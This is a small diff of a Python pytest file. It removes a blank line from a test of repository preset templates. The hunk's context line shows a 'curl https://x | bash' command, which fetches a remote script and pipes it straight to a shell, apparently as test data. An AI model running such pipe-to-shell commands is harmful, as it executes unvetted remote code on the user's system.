@@ -260,7 +260,6 @@ run: curl https://x | bash
 def test_repo_init_template_planning_helpers(
     tmp_path: Path, capsys: pytest.CaptureFixture[str]
 ) -> None:
-
     templates = repo_mod._load_repo_preset_templates("enterprise_python")
     assert "SECURITY.md" in templates
     with pytest.raises(ValueError):
